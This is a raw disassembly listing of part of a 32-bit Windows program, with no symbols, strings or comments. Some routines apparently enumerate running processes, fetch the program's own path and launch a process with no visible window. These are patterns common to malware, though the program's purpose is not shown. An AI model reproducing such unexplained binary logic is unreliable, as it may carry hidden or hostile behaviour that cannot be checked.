  40819b:	ff 15 98 00 41 00    	call   *0x410098
  4081a1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4081a4:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4081a7:	50                   	push   %eax
  4081a8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4081ab:	50                   	push   %eax
  4081ac:	ff 15 4c 02 41 00    	call   *0x41024c
  4081b2:	8b 45 08             	mov    0x8(%ebp),%eax
  4081b5:	c9                   	leave
  4081b6:	c3                   	ret
  4081b7:	55                   	push   %ebp
  4081b8:	8b ec                	mov    %esp,%ebp
  4081ba:	81 ec 20 03 00 00    	sub    $0x320,%esp
  4081c0:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4081c3:	57                   	push   %edi
  4081c4:	50                   	push   %eax
  4081c5:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4081c8:	ff 15 50 02 41 00    	call   *0x410250
  4081ce:	e8 e2 6e 00 00       	call   0x40f0b5
  4081d3:	6a 00                	push   $0x0
  4081d5:	6a 02                	push   $0x2
  4081d7:	a2 90 5b 41 00       	mov    %al,0x415b90
  4081dc:	e8 0f 7a 00 00       	call   0x40fbf0
  4081e1:	8b f8                	mov    %eax,%edi
  4081e3:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4081e9:	50                   	push   %eax
  4081ea:	57                   	push   %edi
  4081eb:	c7 85 e0 fc ff ff 2c 	movl   $0x22c,-0x320(%ebp)
  4081f2:	02 00 00 
  4081f5:	e8 02 7a 00 00       	call   0x40fbfc
  4081fa:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  408200:	50                   	push   %eax
  408201:	57                   	push   %edi
  408202:	e8 ef 79 00 00       	call   0x40fbf6
  408207:	85 c0                	test   %eax,%eax
  408209:	0f 84 b4 01 00 00    	je     0x4083c3
  40820f:	56                   	push   %esi
  408210:	be 58 11 41 00       	mov    $0x411158,%esi
  408215:	8d 45 ff             	lea    -0x1(%ebp),%eax
  408218:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40821b:	50                   	push   %eax
  40821c:	8d 85 04 fd ff ff    	lea    -0x2fc(%ebp),%eax
  408222:	50                   	push   %eax
  408223:	ff 15 bc 02 41 00    	call   *0x4102bc
  408229:	68 58 08 41 00       	push   $0x410858
  40822e:	ff b5 e8 fc ff ff    	push   -0x318(%ebp)
  408234:	e8 a6 6e 00 00       	call   0x40f0df
  408239:	0f b6 c0             	movzbl %al,%eax
  40823c:	50                   	push   %eax
  40823d:	8d 85 1c ff ff ff    	lea    -0xe4(%ebp),%eax
  408243:	50                   	push   %eax
  408244:	e8 ec 6a 00 00       	call   0x40ed35
  408249:	83 c4 0c             	add    $0xc,%esp
  40824c:	50                   	push   %eax
  40824d:	56                   	push   %esi
  40824e:	ff b5 e8 fc ff ff    	push   -0x318(%ebp)
  408254:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  40825a:	50                   	push   %eax
  40825b:	e8 d5 6a 00 00       	call   0x40ed35
  408260:	59                   	pop    %ecx
  408261:	59                   	pop    %ecx
  408262:	50                   	push   %eax
  408263:	56                   	push   %esi
  408264:	ff b5 e8 fc ff ff    	push   -0x318(%ebp)
  40826a:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  408270:	50                   	push   %eax
  408271:	e8 f4 6e 00 00       	call   0x40f16a
  408276:	50                   	push   %eax
  408277:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40827d:	50                   	push   %eax
  40827e:	e8 50 6b 00 00       	call   0x40edd3
  408283:	83 c4 10             	add    $0x10,%esp
  408286:	50                   	push   %eax
  408287:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40828a:	56                   	push   %esi
  40828b:	50                   	push   %eax
  40828c:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40828f:	50                   	push   %eax
  408290:	e8 3e 6b 00 00       	call   0x40edd3
  408295:	50                   	push   %eax
  408296:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408299:	50                   	push   %eax
  40829a:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40829d:	50                   	push   %eax
  40829e:	e8 71 79 00 00       	call   0x40fc14
  4082a3:	83 c4 14             	add    $0x14,%esp
  4082a6:	50                   	push   %eax
  4082a7:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  4082ad:	50                   	push   %eax
  4082ae:	e8 6d 79 00 00       	call   0x40fc20
  4082b3:	83 c4 0c             	add    $0xc,%esp
  4082b6:	50                   	push   %eax
  4082b7:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4082ba:	50                   	push   %eax
  4082bb:	e8 54 79 00 00       	call   0x40fc14
  4082c0:	83 c4 0c             	add    $0xc,%esp
  4082c3:	50                   	push   %eax
  4082c4:	8d 85 0c ff ff ff    	lea    -0xf4(%ebp),%eax
  4082ca:	50                   	push   %eax
  4082cb:	e8 50 79 00 00       	call   0x40fc20
  4082d0:	83 c4 0c             	add    $0xc,%esp
  4082d3:	50                   	push   %eax
  4082d4:	8d 45 8c             	lea    -0x74(%ebp),%eax
  4082d7:	50                   	push   %eax
  4082d8:	e8 37 79 00 00       	call   0x40fc14
  4082dd:	83 c4 0c             	add    $0xc,%esp
  4082e0:	50                   	push   %eax
  4082e1:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  4082e7:	50                   	push   %eax
  4082e8:	e8 33 79 00 00       	call   0x40fc20
  4082ed:	83 c4 0c             	add    $0xc,%esp
  4082f0:	50                   	push   %eax
  4082f1:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4082f4:	50                   	push   %eax
  4082f5:	e8 1a 79 00 00       	call   0x40fc14
  4082fa:	83 c4 0c             	add    $0xc,%esp
  4082fd:	50                   	push   %eax
  4082fe:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  408304:	50                   	push   %eax
  408305:	e8 16 79 00 00       	call   0x40fc20
  40830a:	83 c4 0c             	add    $0xc,%esp
  40830d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408310:	50                   	push   %eax
  408311:	ff 15 64 02 41 00    	call   *0x410264
  408317:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40831d:	ff 15 54 02 41 00    	call   *0x410254
  408323:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  408326:	ff 15 54 02 41 00    	call   *0x410254
  40832c:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  408332:	ff 15 54 02 41 00    	call   *0x410254
  408338:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40833b:	ff 15 54 02 41 00    	call   *0x410254
  408341:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  408347:	ff 15 54 02 41 00    	call   *0x410254
  40834d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408350:	ff 15 54 02 41 00    	call   *0x410254
  408356:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  40835c:	ff 15 54 02 41 00    	call   *0x410254
  408362:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  408365:	ff 15 54 02 41 00    	call   *0x410254
  40836b:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40836e:	ff 15 54 02 41 00    	call   *0x410254
  408374:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40837a:	ff 15 54 02 41 00    	call   *0x410254
  408380:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  408386:	ff 15 c0 02 41 00    	call   *0x4102c0
  40838c:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  408392:	ff 15 54 02 41 00    	call   *0x410254
  408398:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  40839e:	ff 15 54 02 41 00    	call   *0x410254
  4083a4:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4083a7:	ff 15 c0 02 41 00    	call   *0x4102c0
  4083ad:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4083b3:	50                   	push   %eax
  4083b4:	57                   	push   %edi
  4083b5:	e8 3c 78 00 00       	call   0x40fbf6
  4083ba:	85 c0                	test   %eax,%eax
  4083bc:	0f 85 53 fe ff ff    	jne    0x408215
  4083c2:	5e                   	pop    %esi
  4083c3:	57                   	push   %edi
  4083c4:	ff 15 58 01 41 00    	call   *0x410158
  4083ca:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4083cd:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4083d0:	50                   	push   %eax
  4083d1:	ff 15 60 02 41 00    	call   *0x410260
  4083d7:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4083da:	ff 15 54 02 41 00    	call   *0x410254
  4083e0:	8b 45 08             	mov    0x8(%ebp),%eax
  4083e3:	5f                   	pop    %edi
  4083e4:	c9                   	leave
  4083e5:	c3                   	ret
  4083e6:	55                   	push   %ebp
  4083e7:	8b ec                	mov    %esp,%ebp
  4083e9:	83 ec 44             	sub    $0x44,%esp
  4083ec:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4083ef:	56                   	push   %esi
  4083f0:	50                   	push   %eax
  4083f1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4083f4:	ff 15 50 02 41 00    	call   *0x410250
  4083fa:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  4083fd:	ff 15 34 02 41 00    	call   *0x410234
  408403:	8b f0                	mov    %eax,%esi
  408405:	80 3e 00             	cmpb   $0x0,(%esi)
  408408:	0f 84 85 00 00 00    	je     0x408493
  40840e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408411:	6a 0a                	push   $0xa
  408413:	50                   	push   %eax
  408414:	56                   	push   %esi
  408415:	ff 15 a8 00 41 00    	call   *0x4100a8
  40841b:	50                   	push   %eax
  40841c:	ff 15 5c 03 41 00    	call   *0x41035c
  408422:	83 c4 0c             	add    $0xc,%esp
  408425:	8d 45 ff             	lea    -0x1(%ebp),%eax
  408428:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40842b:	6a 2d                	push   $0x2d
  40842d:	50                   	push   %eax
  40842e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408431:	50                   	push   %eax
  408432:	ff 15 4c 02 41 00    	call   *0x41024c
  408438:	8b c8                	mov    %eax,%ecx
  40843a:	ff 15 58 02 41 00    	call   *0x410258
  408440:	50                   	push   %eax
  408441:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408444:	50                   	push   %eax
  408445:	8d 45 cc             	lea    -0x34(%ebp),%eax
  408448:	50                   	push   %eax
  408449:	e8 d2 77 00 00       	call   0x40fc20
  40844e:	83 c4 0c             	add    $0xc,%esp
  408451:	50                   	push   %eax
  408452:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408455:	50                   	push   %eax
  408456:	e8 cb 77 00 00       	call   0x40fc26
  40845b:	83 c4 0c             	add    $0xc,%esp
  40845e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408461:	50                   	push   %eax
  408462:	ff 15 64 02 41 00    	call   *0x410264
  408468:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40846b:	ff 15 54 02 41 00    	call   *0x410254
  408471:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408474:	ff 15 54 02 41 00    	call   *0x410254
  40847a:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40847d:	ff 15 54 02 41 00    	call   *0x410254
  408483:	56                   	push   %esi
  408484:	ff 15 a4 00 41 00    	call   *0x4100a4
  40848a:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  40848e:	e9 72 ff ff ff       	jmp    0x408405
  408493:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408496:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408499:	50                   	push   %eax
  40849a:	ff 15 60 02 41 00    	call   *0x410260
  4084a0:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4084a3:	ff 15 54 02 41 00    	call   *0x410254
  4084a9:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  4084ac:	ff 15 54 02 41 00    	call   *0x410254
  4084b2:	8b 45 08             	mov    0x8(%ebp),%eax
  4084b5:	5e                   	pop    %esi
  4084b6:	c9                   	leave
  4084b7:	c3                   	ret
  4084b8:	55                   	push   %ebp
  4084b9:	8b ec                	mov    %esp,%ebp
  4084bb:	83 ec 54             	sub    $0x54,%esp
  4084be:	56                   	push   %esi
  4084bf:	57                   	push   %edi
  4084c0:	6a 11                	push   $0x11
  4084c2:	33 c0                	xor    %eax,%eax
  4084c4:	59                   	pop    %ecx
  4084c5:	8d 7d ac             	lea    -0x54(%ebp),%edi
  4084c8:	f3 ab                	rep stos %eax,%es:(%edi)
  4084ca:	8d 7d f0             	lea    -0x10(%ebp),%edi
  4084cd:	c7 45 ac 44 00 00 00 	movl   $0x44,-0x54(%ebp)
  4084d4:	ab                   	stos   %eax,%es:(%edi)
  4084d5:	ab                   	stos   %eax,%es:(%edi)
  4084d6:	ab                   	stos   %eax,%es:(%edi)
  4084d7:	ab                   	stos   %eax,%es:(%edi)
  4084d8:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4084db:	50                   	push   %eax
  4084dc:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4084df:	50                   	push   %eax
  4084e0:	33 c0                	xor    %eax,%eax
  4084e2:	50                   	push   %eax
  4084e3:	50                   	push   %eax
  4084e4:	68 00 00 00 08       	push   $0x8000000
  4084e9:	50                   	push   %eax
  4084ea:	50                   	push   %eax
  4084eb:	50                   	push   %eax
  4084ec:	68 78 11 41 00       	push   $0x411178
  4084f1:	68 5c 11 41 00       	push   $0x41115c
  4084f6:	ff 15 ac 00 41 00    	call   *0x4100ac
  4084fc:	ff 75 f0             	push   -0x10(%ebp)
  4084ff:	8b 35 58 01 41 00    	mov    0x410158,%esi
  408505:	ff d6                	call   *%esi
  408507:	ff 75 f4             	push   -0xc(%ebp)
  40850a:	ff d6                	call   *%esi
  40850c:	5f                   	pop    %edi
  40850d:	5e                   	pop    %esi
  40850e:	c9                   	leave
  40850f:	c3                   	ret
  408510:	55                   	push   %ebp
  408511:	8b ec                	mov    %esp,%ebp
  408513:	53                   	push   %ebx
  408514:	56                   	push   %esi
  408515:	57                   	push   %edi
  408516:	8b 7d 08             	mov    0x8(%ebp),%edi
  408519:	8b f1                	mov    %ecx,%esi
  40851b:	3b f7                	cmp    %edi,%esi
  40851d:	0f 84 f4 00 00 00    	je     0x408617
  408523:	8b cf                	mov    %edi,%ecx
  408525:	e8 8b 8d ff ff       	call   0x4012b5
  40852a:	8b ce                	mov    %esi,%ecx
  40852c:	8b d8                	mov    %eax,%ebx
  40852e:	e8 82 8d ff ff       	call   0x4012b5
  408533:	3b d8                	cmp    %eax,%ebx
  408535:	77 3b                	ja     0x408572
  408537:	ff 76 04             	push   0x4(%esi)
  40853a:	8b cf                	mov    %edi,%ecx
  40853c:	e8 f6 00 00 00       	call   0x408637
  408541:	50                   	push   %eax
  408542:	8b cf                	mov    %edi,%ecx
  408544:	e8 ea 00 00 00       	call   0x408633
  408549:	50                   	push   %eax
  40854a:	e8 3d 01 00 00       	call   0x40868c
  40854f:	83 c4 0c             	add    $0xc,%esp
  408552:	8b ce                	mov    %esi,%ecx
  408554:	ff 76 08             	push   0x8(%esi)
  408557:	50                   	push   %eax
  408558:	e8 0e 96 ff ff       	call   0x401b6b
  40855d:	8b cf                	mov    %edi,%ecx
  40855f:	e8 51 8d ff ff       	call   0x4012b5
  408564:	c1 e0 04             	shl    $0x4,%eax
  408567:	03 46 04             	add    0x4(%esi),%eax
  40856a:	89 46 08             	mov    %eax,0x8(%esi)
  40856d:	e9 a5 00 00 00       	jmp    0x408617
  408572:	8b cf                	mov    %edi,%ecx
  408574:	e8 3c 8d ff ff       	call   0x4012b5
  408579:	8b ce                	mov    %esi,%ecx
  40857b:	8b d8                	mov    %eax,%ebx
  40857d:	e8 9e 00 00 00       	call   0x408620
  408582:	3b d8                	cmp    %eax,%ebx
  408584:	77 3e                	ja     0x4085c4
  408586:	8b ce                	mov    %esi,%ecx
  408588:	e8 28 8d ff ff       	call   0x4012b5
  40858d:	8b d8                	mov    %eax,%ebx
  40858f:	8b cf                	mov    %edi,%ecx
  408591:	c1 e3 04             	shl    $0x4,%ebx
  408594:	e8 9a 00 00 00       	call   0x408633
  408599:	ff 76 04             	push   0x4(%esi)
  40859c:	03 d8                	add    %eax,%ebx
  40859e:	8b cf                	mov    %edi,%ecx
  4085a0:	53                   	push   %ebx
  4085a1:	e8 8d 00 00 00       	call   0x408633
  4085a6:	50                   	push   %eax
  4085a7:	e8 e0 00 00 00       	call   0x40868c
  4085ac:	83 c4 0c             	add    $0xc,%esp
  4085af:	8b cf                	mov    %edi,%ecx
  4085b1:	ff 76 08             	push   0x8(%esi)
  4085b4:	e8 7e 00 00 00       	call   0x408637
  4085b9:	50                   	push   %eax
  4085ba:	53                   	push   %ebx
  4085bb:	8b ce                	mov    %esi,%ecx
  4085bd:	e8 79 00 00 00       	call   0x40863b
  4085c2:	eb 99                	jmp    0x40855d
  4085c4:	ff 76 08             	push   0x8(%esi)
  4085c7:	8b ce                	mov    %esi,%ecx
  4085c9:	ff 76 04             	push   0x4(%esi)
  4085cc:	e8 9a 95 ff ff       	call   0x401b6b
  4085d1:	8b 46 04             	mov    0x4(%esi),%eax
  4085d4:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4085d7:	2b c8                	sub    %eax,%ecx
  4085d9:	c1 f9 04             	sar    $0x4,%ecx
  4085dc:	51                   	push   %ecx
  4085dd:	50                   	push   %eax
  4085de:	8b ce                	mov    %esi,%ecx
  4085e0:	e8 41 b0 ff ff       	call   0x403626
  4085e5:	6a 00                	push   $0x0
  4085e7:	8b cf                	mov    %edi,%ecx
  4085e9:	e8 c7 8c ff ff       	call   0x4012b5
  4085ee:	50                   	push   %eax
  4085ef:	8b ce                	mov    %esi,%ecx
  4085f1:	e8 bf 95 ff ff       	call   0x401bb5
  4085f6:	50                   	push   %eax
  4085f7:	8b cf                	mov    %edi,%ecx
  4085f9:	89 46 04             	mov    %eax,0x4(%esi)
  4085fc:	e8 36 00 00 00       	call   0x408637
  408601:	50                   	push   %eax
  408602:	8b cf                	mov    %edi,%ecx
  408604:	e8 2a 00 00 00       	call   0x408633
  408609:	50                   	push   %eax
  40860a:	8b ce                	mov    %esi,%ecx
  40860c:	e8 2a 00 00 00       	call   0x40863b
  408611:	89 46 08             	mov    %eax,0x8(%esi)
  408614:	89 46 0c             	mov    %eax,0xc(%esi)
  408617:	8b c6                	mov    %esi,%eax
  408619:	5f                   	pop    %edi
  40861a:	5e                   	pop    %esi
  40861b:	5b                   	pop    %ebx
  40861c:	5d                   	pop    %ebp
  40861d:	c2 04 00             	ret    $0x4
  408620:	8b 51 04             	mov    0x4(%ecx),%edx
  408623:	85 d2                	test   %edx,%edx
  408625:	75 03                	jne    0x40862a
  408627:	33 c0                	xor    %eax,%eax
  408629:	c3                   	ret
  40862a:	8b 41 0c             	mov    0xc(%ecx),%eax
  40862d:	2b c2                	sub    %edx,%eax
  40862f:	c1 f8 04             	sar    $0x4,%eax
  408632:	c3                   	ret
  408633:	8b 41 04             	mov    0x4(%ecx),%eax
  408636:	c3                   	ret
  408637:	8b 41 08             	mov    0x8(%ecx),%eax
  40863a:	c3                   	ret
  40863b:	55                   	push   %ebp
  40863c:	8b ec                	mov    %esp,%ebp
  40863e:	56                   	push   %esi
  40863f:	8b 75 08             	mov    0x8(%ebp),%esi
  408642:	57                   	push   %edi
  408643:	8b f9                	mov    %ecx,%edi
  408645:	3b 75 0c             	cmp    0xc(%ebp),%esi
  408648:	74 14                	je     0x40865e
  40864a:	56                   	push   %esi
  40864b:	8b cf                	mov    %edi,%ecx
  40864d:	ff 75 10             	push   0x10(%ebp)
  408650:	e8 73 95 ff ff       	call   0x401bc8
  408655:	83 45 10 10          	addl   $0x10,0x10(%ebp)
  408659:	83 c6 10             	add    $0x10,%esi
  40865c:	eb e7                	jmp    0x408645
  40865e:	8b 45 10             	mov    0x10(%ebp),%eax
  408661:	5f                   	pop    %edi
  408662:	5e                   	pop    %esi
  408663:	5d                   	pop    %ebp
  408664:	c2 0c 00             	ret    $0xc
  408667:	55                   	push   %ebp
  408668:	8b ec                	mov    %esp,%ebp
  40866a:	56                   	push   %esi
  40866b:	8b 75 08             	mov    0x8(%ebp),%esi
  40866e:	3b 75 0c             	cmp    0xc(%ebp),%esi
  408671:	74 13                	je     0x408686
  408673:	0f be 06             	movsbl (%esi),%eax
  408676:	50                   	push   %eax
  408677:	ff 55 14             	call   *0x14(%ebp)
  40867a:	59                   	pop    %ecx
  40867b:	46                   	inc    %esi
  40867c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40867f:	ff 45 10             	incl   0x10(%ebp)
  408682:	88 01                	mov    %al,(%ecx)
  408684:	eb e8                	jmp    0x40866e
  408686:	8b 45 10             	mov    0x10(%ebp),%eax
  408689:	5e                   	pop    %esi
  40868a:	5d                   	pop    %ebp
  40868b:	c3                   	ret
  40868c:	55                   	push   %ebp
  40868d:	8b ec                	mov    %esp,%ebp
  40868f:	56                   	push   %esi
  408690:	8b 75 08             	mov    0x8(%ebp),%esi
  408693:	3b 75 0c             	cmp    0xc(%ebp),%esi
  408696:	74 13                	je     0x4086ab
  408698:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40869b:	56                   	push   %esi
  40869c:	ff 15 64 02 41 00    	call   *0x410264
  4086a2:	83 45 10 10          	addl   $0x10,0x10(%ebp)
  4086a6:	83 c6 10             	add    $0x10,%esi
  4086a9:	eb e8                	jmp    0x408693
  4086ab:	8b 45 10             	mov    0x10(%ebp),%eax
  4086ae:	5e                   	pop    %esi
  4086af:	5d                   	pop    %ebp
  4086b0:	c3                   	ret
  4086b1:	55                   	push   %ebp
  4086b2:	8b ec                	mov    %esp,%ebp
  4086b4:	81 ec bc 03 00 00    	sub    $0x3bc,%esp
  4086ba:	53                   	push   %ebx
  4086bb:	56                   	push   %esi
  4086bc:	57                   	push   %edi
  4086bd:	8d 85 44 fc ff ff    	lea    -0x3bc(%ebp),%eax
  4086c3:	68 04 01 00 00       	push   $0x104
  4086c8:	50                   	push   %eax
  4086c9:	6a 00                	push   $0x0
  4086cb:	ff 15 6c 00 41 00    	call   *0x41006c
  4086d1:	80 65 fe 00          	andb   $0x0,-0x2(%ebp)
  4086d5:	80 65 fc 00          	andb   $0x0,-0x4(%ebp)
  4086d9:	80 65 fd 00          	andb   $0x0,-0x3(%ebp)
  4086dd:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4086e0:	50                   	push   %eax
  4086e1:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  4086e7:	ff 15 50 02 41 00    	call   *0x410250
  4086ed:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4086f0:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4086f6:	50                   	push   %eax
  4086f7:	ff 15 50 02 41 00    	call   *0x410250
  4086fd:	8d 45 ff             	lea    -0x1(%ebp),%eax
  408700:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  408706:	50                   	push   %eax
  408707:	ff 15 50 02 41 00    	call   *0x410250
  40870d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408710:	50                   	push   %eax
  408711:	e8 a5 5f 00 00       	call   0x40e6bb
  408716:	59                   	pop    %ecx
  408717:	8b c8                	mov    %eax,%ecx
  408719:	ff 15 58 02 41 00    	call   *0x410258
  40871f:	50                   	push   %eax
  408720:	8d 85 38 ff ff ff    	lea    -0xc8(%ebp),%eax
  408726:	6a 30                	push   $0x30
  408728:	50                   	push   %eax
  408729:	e8 01 ea ff ff       	call   0x40712f
  40872e:	83 c4 0c             	add    $0xc,%esp
  408731:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408734:	ff 15 54 02 41 00    	call   *0x410254
  40873a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40873d:	50                   	push   %eax
  40873e:	e8 78 5f 00 00       	call   0x40e6bb
  408743:	59                   	pop    %ecx
  408744:	8b c8                	mov    %eax,%ecx
  408746:	ff 15 58 02 41 00    	call   *0x410258
  40874c:	50                   	push   %eax
  40874d:	8d 85 18 ff ff ff    	lea    -0xe8(%ebp),%eax
  408753:	6a 30                	push   $0x30
  408755:	50                   	push   %eax
  408756:	e8 d4 e9 ff ff       	call   0x40712f
  40875b:	83 c4 0c             	add    $0xc,%esp
  40875e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408761:	ff 15 54 02 41 00    	call   *0x410254
  408767:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40876a:	50                   	push   %eax
  40876b:	e8 4b 5f 00 00       	call   0x40e6bb
  408770:	59                   	pop    %ecx
  408771:	8b c8                	mov    %eax,%ecx
  408773:	ff 15 58 02 41 00    	call   *0x410258
  408779:	50                   	push   %eax
  40877a:	8d 85 08 ff ff ff    	lea    -0xf8(%ebp),%eax
  408780:	6a 30                	push   $0x30
  408782:	50                   	push   %eax
  408783:	e8 a7 e9 ff ff       	call   0x40712f
  408788:	83 c4 0c             	add    $0xc,%esp
  40878b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40878e:	ff 15 54 02 41 00    	call   *0x410254
  408794:	8d 4d 28             	lea    0x28(%ebp),%ecx
  408797:	ff 15 58 02 41 00    	call   *0x410258
  40879d:	50                   	push   %eax
  40879e:	bf 60 08 41 00       	mov    $0x410860,%edi
  4087a3:	8d 85 38 ff ff ff    	lea    -0xc8(%ebp),%eax
  4087a9:	57                   	push   %edi
  4087aa:	50                   	push   %eax
  4087ab:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4087ae:	be 10 12 41 00       	mov    $0x411210,%esi
  4087b3:	50                   	push   %eax
  4087b4:	56                   	push   %esi
  4087b5:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4087b8:	ff 15 4c 02 41 00    	call   *0x41024c
  4087be:	50                   	push   %eax
  4087bf:	8d 85 44 fc ff ff    	lea    -0x3bc(%ebp),%eax
  4087c5:	50                   	push   %eax
  4087c6:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4087c9:	50                   	push   %eax
  4087ca:	e8 4b 74 00 00       	call   0x40fc1a
  4087cf:	83 c4 0c             	add    $0xc,%esp
  4087d2:	50                   	push   %eax
  4087d3:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4087d6:	50                   	push   %eax
  4087d7:	e8 38 74 00 00       	call   0x40fc14
  4087dc:	83 c4 0c             	add    $0xc,%esp
  4087df:	50                   	push   %eax
  4087e0:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4087e3:	50                   	push   %eax
  4087e4:	e8 37 74 00 00       	call   0x40fc20
  4087e9:	83 c4 0c             	add    $0xc,%esp
  4087ec:	8b c8                	mov    %eax,%ecx
  4087ee:	ff 15 58 02 41 00    	call   *0x410258
  4087f4:	50                   	push   %eax
  4087f5:	e8 7d 4c 00 00       	call   0x40d477
  4087fa:	59                   	pop    %ecx
  4087fb:	59                   	pop    %ecx
  4087fc:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4087ff:	ff 15 54 02 41 00    	call   *0x410254
  408805:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  408808:	ff 15 54 02 41 00    	call   *0x410254
  40880e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408811:	ff 15 54 02 41 00    	call   *0x410254
  408817:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40881a:	ff 15 54 02 41 00    	call   *0x410254
  408820:	8d 4d 38             	lea    0x38(%ebp),%ecx
  408823:	ff 15 58 02 41 00    	call   *0x410258
  408829:	50                   	push   %eax
  40882a:	8d 85 18 ff ff ff    	lea    -0xe8(%ebp),%eax
  408830:	57                   	push   %edi
  408831:	50                   	push   %eax
  408832:	8d 45 ff             	lea    -0x1(%ebp),%eax
  408835:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408838:	50                   	push   %eax
  408839:	56                   	push   %esi
  40883a:	ff 15 4c 02 41 00    	call   *0x41024c
  408840:	50                   	push   %eax
  408841:	8d 85 44 fc ff ff    	lea    -0x3bc(%ebp),%eax
  408847:	50                   	push   %eax
  408848:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40884b:	50                   	push   %eax
  40884c:	e8 c9 73 00 00       	call   0x40fc1a
  408851:	83 c4 0c             	add    $0xc,%esp
  408854:	50                   	push   %eax
  408855:	8d 45 d8             	lea    -0x28(%ebp),%eax
  408858:	50                   	push   %eax
  408859:	e8 b6 73 00 00       	call   0x40fc14
  40885e:	83 c4 0c             	add    $0xc,%esp
  408861:	50                   	push   %eax
  408862:	8d 45 c0             	lea    -0x40(%ebp),%eax
  408865:	50                   	push   %eax
  408866:	e8 b5 73 00 00       	call   0x40fc20
  40886b:	83 c4 0c             	add    $0xc,%esp
  40886e:	8b c8                	mov    %eax,%ecx
  408870:	ff 15 58 02 41 00    	call   *0x410258
  408876:	50                   	push   %eax
  408877:	e8 fb 4b 00 00       	call   0x40d477
  40887c:	59                   	pop    %ecx
  40887d:	59                   	pop    %ecx
  40887e:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  408881:	ff 15 54 02 41 00    	call   *0x410254
  408887:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40888a:	ff 15 54 02 41 00    	call   *0x410254
  408890:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  408893:	ff 15 54 02 41 00    	call   *0x410254
  408899:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40889c:	ff 15 54 02 41 00    	call   *0x410254
  4088a2:	8d 4d 48             	lea    0x48(%ebp),%ecx
  4088a5:	ff 15 58 02 41 00    	call   *0x410258
